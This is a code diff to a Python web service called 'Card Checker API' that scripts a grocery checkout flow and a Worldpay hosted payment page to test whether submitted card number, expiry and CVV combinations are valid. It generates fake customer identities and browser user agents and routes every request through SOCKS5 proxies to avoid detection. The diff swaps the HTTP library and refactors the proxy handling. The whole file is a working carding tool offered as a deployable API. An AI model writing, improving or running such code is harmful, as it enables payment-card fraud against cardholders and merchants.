@@ -5,9 +5,9 @@ import time
 from functools import wraps
 from pathlib import Path
 from typing import Optional, Tuple
+import os
 
-import curl_cffi.requests
-import curl_cffi.requests.exceptions as curl_exceptions
+import httpx
 from bs4 import BeautifulSoup, Tag
 from fake_useragent import FakeUserAgent
 from faker import Faker
@@ -98,9 +98,18 @@ def retry_request(attempts=3, delay=2, exceptions=(Exception,)):
 
 async def request_with_retry(session_method, *args, **kwargs):
     retryable = retry_request(
-        attempts=3, delay=1, exceptions=(curl_exceptions.Timeout,)
+        attempts=3, delay=1, exceptions=(httpx.TimeoutException, httpx.ConnectError)
     )(session_method)
     return await retryable(*args, **kwargs)
+
+def get_proxy_config():
+    """Get proxy configuration"""
+    proxy_parts = PROXY.split(":")
+    proxy = proxy_parts[0]
+    port = proxy_parts[1]
+    username = proxy_parts[2]
+    password = proxy_parts[3]
+    return f"socks5://{username}:{password}@{proxy}:{port}"
 
 async def worldpay_auth_with_cache(card: str, use_cache=True):
     card_number, exp_month, exp_year, cvv = parse_card(card)
@@ -127,25 +136,18 @@ async def verify_card_with_cached_session(
     eventvalidation = cached_session["eventvalidation"]
     cookies = cached_session.get("cookies", {})
 
-    proxy_parts = PROXY.split(":")
-    proxy = proxy_parts[0]
-    port = proxy_parts[1]
-    username = proxy_parts[2]
-    password = proxy_parts[3]
-
     print("[CACHE] Using cached session for quick verification")
 
-    async with curl_cffi.requests.AsyncSession(
-        impersonate="chrome",
-        proxies={
-            "http": f"socks5h://{username}:{password}@{proxy}:{port}",
-            "https": f"socks5h://{username}:{password}@{proxy}:{port}",
-        },
+    proxy_config = get_proxy_config()
+
+    async with httpx.AsyncClient(
+        proxies={"all://": proxy_config},
         cookies=cookies,
-    ) as session:
+        timeout=httpx.Timeout(10.0)
+    ) as client:
         try:
             resp = await request_with_retry(
-                session.post,
+                client.post,
                 f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                 headers={
                     "accept": "*/*",
@@ -186,10 +188,9 @@ async def verify_card_with_cached_session(
                     "__ASYNCPOST": "true",
                     "": "",
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[FAST ERROR] Request failed with status code: {resp.status_code}")
                 print("[FAST] Falling back to full flow...")
                 return None
@@ -221,23 +222,17 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
     email = f"{first_name.lower()}{last_name.lower()}{fake_us.random_number(digits=3)}@{fake_us.free_email_domain()}"
 
     req_num = 0
-    proxy = PROXY.split(":")[0]
-    port = PROXY.split(":")[1]
-    username = PROXY.split(":")[2]
-    password = PROXY.split(":")[3]
+    proxy_config = get_proxy_config()
 
-    async with curl_cffi.requests.AsyncSession(
-        impersonate="chrome",
-        proxies={
-            "http": f"socks5h://{username}:{password}@{proxy}:{port}",
-            "https": f"socks5h://{username}:{password}@{proxy}:{port}",
-        },
-    ) as session:
+    async with httpx.AsyncClient(
+        proxies={"all://": proxy_config},
+        timeout=httpx.Timeout(15.0)
+    ) as client:
         try:
             # REQ 1: POST to get cart_id
             req_num = 1
             resp = await request_with_retry(
-                session.post,
+                client.post,
                 "https://production-us-1.noq-servers.net/api/v1/application/carts",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -298,10 +293,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "TippingAmount": 0,
                     "TippingPercentage": 0,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
@@ -311,7 +305,7 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
             # REQ 2: PUT to add object to cart
             req_num = 2
             resp = await request_with_retry(
-                session.put,
+                client.put,
                 f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}/update-items",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -350,17 +344,16 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                         "PreferredSubstitutionIds": [],
                     }
                 ],
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
             # REQ 3: GET to get timeslots
             req_num = 3
             resp = await request_with_retry(
-                session.get,
+                client.get,
                 "https://production-us-1.noq-servers.net/api/v1/application/stores/1021/timeslots",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -417,10 +410,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "TaxIncluded": False,
                     "TippingPercentage": 0,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
@@ -447,13 +439,10 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                 print(f"[REQ {req_num} ERROR] No open timeslots available.")
                 return "error", "No open timeslots available"
 
-            # Continuar con REQ 4-9 (resto del código igual)...
-            # [El resto del código sigue igual hasta el final de worldpay_auth]
-
             # REQ 4: PUT timeslot
             req_num = 4
             resp = await request_with_retry(
-                session.put,
+                client.put,
                 f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -510,17 +499,16 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "TaxIncluded": False,
                     "TippingPercentage": 0,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
             # REQ 5: PUT to set name, email and phone
             req_num = 5
             resp = await request_with_retry(
-                session.put,
+                client.put,
                 f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -592,10 +580,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "TippingAmount": 0,
                     "TippingPercentage": 0,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
@@ -610,7 +597,7 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
             # REQ 6: PUT to solve all errors
             req_num = 6
             resp = await request_with_retry(
-                session.put,
+                client.put,
                 f"https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_id}",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -682,17 +669,16 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "TippingAmount": 0,
                     "TippingPercentage": 0,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
 
             # REQ 7: POST to get transaction ID
             req_num = 7
             resp = await request_with_retry(
-                session.post,
+                client.post,
                 "https://production-us-1.noq-servers.net/api/v1/application/customer/worldpay-payment-transaction-session",
                 headers={
                     "accept": "application/json, text/javascript, */*; q=0.01",
@@ -718,10 +704,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "css": "body{background-color:#ffffff;color:#5d5d5d;  font-family:sans-serif!important;  font-size:14px;margin:0;padding-top:7px;}  .divMainForm{min-width:300px!important;padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}#tableMainForm{border:0;border-collapse:collapse;}#tableCardInformation{border:0;border-collapse:collapse;}#tableManualEntry{border:0;border-collapse:collapse;}#tableTransactionButtons{border:0;border-collapse:collapse;}#tdTransactionButtons{border:0;}  #trTransactionInformation{display:none;}.content{border:0;  padding-top:0px!important;padding-right:0px!important;padding-bottom:0px!important;padding-left:0px!important;}.progressMessage{display:none;}.progressImage{width:50px;height:50px;}  .error{color:#d16262!important;}  .required{display:none;}    .tableErrorMessage{background-color:#fdfadb!important;border-collapse:collapse;border-color:#e3e4e6!important;border-radius:2px!important;border-style:solid;border-width:1px!important;color:inherit!important;font-size:14px!important;font-weight:500!important;margin-bottom:16px!important;  }  .tableTdErrorMessage{background-color:transparent;border-collapse:collapse;padding-bottom:16px!important;padding-left:24px!important;padding-right:24px!important;padding-top:16px!important;}  .tdHeader{display:none;}  .tdLabel{display:block;font-weight:600;line-height:1.5;padding-right:0.5em;text-align:left;}.tdField{display:block;line-height:1.5;padding-bottom:12px;}.inputText{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-size:14px;padding-bottom:12px;padding-left:12px;padding-right:12px;padding-top:12px;}  .selectOption{background-color:white;border-color:rgba(0,0,0,0.1);border-radius:2px;box-shadow:none;color:#5d5d5d;font-family:inherit;font-size:14px;line-height:normal;margin:0;}#ddlExpirationMonth{display:inline-block;min-width:6em;padding:8px;}#ddlExpirationYear{display:inline-block;min-width:6em;padding:8px;}    .tdTransactionButtons{line-height:0;}  #submit:link{background-color:#c01e16!important;color:#ffffff!important;border-radius:2px;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#tempButton:link{background-color:green!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}#btnCancel:link{background-color:#616161!important;color:white!important;border-radius:2px!important;border:0!important;cursor:pointer!important;display:block!important;font-size:14px!important;font-weight:500!important;line-height:normal;margin-top:8px!important;padding-bottom:10px!important;padding-left:16px!important;padding-right:16px!important;padding-top:10px!important;text-align:center!important;text-decoration:none!important;}",
                     "bd": "1756267583677.EWWClv",
                 },
-                timeout=10,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(resp.text)
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
@@ -731,7 +716,7 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
             # REQ 8: GET to get viewstate, viewstategenerator and eventvalidation
             req_num = 8
             resp = await request_with_retry(
-                session.get,
+                client.get,
                 f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                 headers={
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
@@ -744,10 +729,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "upgrade-insecure-requests": "1",
                     "user-agent": user_agent,
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(resp.text)
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
@@ -772,7 +756,7 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                 "viewstate": viewstate,
                 "viewstategenerator": viewstategenerator,
                 "eventvalidation": eventvalidation,
-                "cookies": dict(session.cookies),
+                "cookies": dict(client.cookies),
                 "cart_id": cart_id,
                 "customer_id": customer_id,
             }
@@ -782,7 +766,7 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
             # REQ 9: POST to verify card
             req_num = 9
             resp = await request_with_retry(
-                session.post,
+                client.post,
                 f"https://transaction.hostedpayments.com/?TransactionSetupId={transaction_id}",
                 headers={
                     "accept": "*/*",
@@ -823,10 +807,9 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
                     "__ASYNCPOST": "true",
                     "": "",
                 },
-                timeout=6,
             )
 
-            if not resp.ok:
+            if resp.status_code != 200:
                 print(resp.text)
                 print(f"[REQ {req_num} ERROR] Request failed with status code: {resp.status_code}")
                 return "error", f"Request {req_num} failed"
@@ -852,7 +835,12 @@ async def worldpay_auth(card_number, exp_month, exp_year, cvv, session_cache):
 # API Endpoints
 @app.get("/")
 async def root():
-    return {"message": "Card Checker API", "version": "1.0.0", "usage": "GET /?cc=card_number|exp_month|exp_year|cvv"}
+    return {
+        "message": "Card Checker API", 
+        "version": "1.0.0", 
+        "usage": "GET /?cc=card_number|exp_month|exp_year|cvv",
+        "status": "online"
+    }
 
 @app.get("/check")
 async def check_card(cc: str = Query(..., description="Card data in format: card_number|exp_month|exp_year|cvv")):
@@ -908,7 +896,8 @@ async def health_check():
     return {"status": "healthy", "timestamp": int(time.time())}
 
 if __name__ == "__main__":
+    port = int(os.getenv("PORT", 8000))
     print("Starting Card Checker API...")
-    print("Usage: GET /?cc=4111111111111111|12|25|123")
-    print("       GET /check?cc=4111111111111111|12|25|123")
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    print(f"Usage: GET /?cc=4111111111111111|12|25|123")
+    print(f"       GET /check?cc=4111111111111111|12|25|123")
+    uvicorn.run(app, host="0.0.0.0", port=port)
